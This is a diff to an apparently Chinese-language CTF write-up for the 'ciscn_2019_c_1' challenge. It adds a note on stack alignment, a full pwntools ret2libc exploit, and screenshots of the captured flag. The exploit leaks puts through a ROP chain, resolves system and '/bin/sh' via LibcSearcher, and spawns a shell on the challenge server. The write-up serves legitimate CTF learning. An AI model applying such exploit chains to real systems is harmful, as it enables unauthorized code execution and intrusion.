@@ -138,4 +138,58 @@ bin_sh_addr=libc_base+libc.dump("str_bin_sh")
 
 #很多萌新可能和我一样，好奇为什么这里要用str_bin_sh，我总结了一下，只是LibcSearcher的键名这样设置，以后多写几次就记住了
 
-差不多了，添加第二次payload内容
+差不多了，添加第二次 payload 内容
+
+> [!IMPORTANT]
+> 之所以在第二次构造 payload 的时候多加了一个 ret_addr 是因为要保证栈对齐，
+
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+r=remote("7c6c798a.tcp-ctf2.dasctf.com", 9999, ssl=True)
+elf=ELF("./ciscn_2019_c_1")
+
+pop_rdi_addr=0x400c83
+put_got=elf.got["puts"]
+put_plt=elf.plt["puts"]
+encrypt_addr=0x4009A0
+ret_addr=0x4006b9
+
+r.sendlineafter("Input your choice!",b"1")
+
+payload=b"a"*88+p64(pop_rdi_addr)+p64(put_got)+p64(put_plt)+p64(encrypt_addr)
+r.sendline(payload)
+r.recvline()
+r.recvline()
+r.recvline()
+r.recvline()
+puts_addr=u64(r.recvuntil(b"\n")[:-1].ljust(8,b"\x00"))
+print(hex(puts_addr))
+
+libc=LibcSearcher("puts",puts_addr)
+libc_base=puts_addr-libc.dump("puts")
+
+system_addr=libc_base+libc.dump("system")
+bin_sh_addr=libc_base+libc.dump("str_bin_sh")
+
+print(hex(system_addr))
+payload1=b"a"*88+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(ret_addr)+p64(system_addr)+p64(encrypt_addr)
+r.sendline(payload1)
+
+r.interactive()
+```
+
+以上是完整的payload
+
+成功获取flag
+
+<img width="2531" height="874" alt="image" src="https://github.com/user-attachments/assets/d20118c2-c9a1-4e6c-9a80-bba93d495da4" />
+
+PS：记录一下（换了个网址，我竟然蹭到第一个做完的了）
+
+<img width="1530" height="1383" alt="屏幕截图 2026-06-02 200030" src="https://github.com/user-attachments/assets/d92f086f-eaf5-4c5b-bd4e-5e7304a4c149" />
+
+<img width="2160" height="999" alt="屏幕截图 2026-06-02 200108" src="https://github.com/user-attachments/assets/0407d240-a054-43bc-b633-939f819354a7" />
+
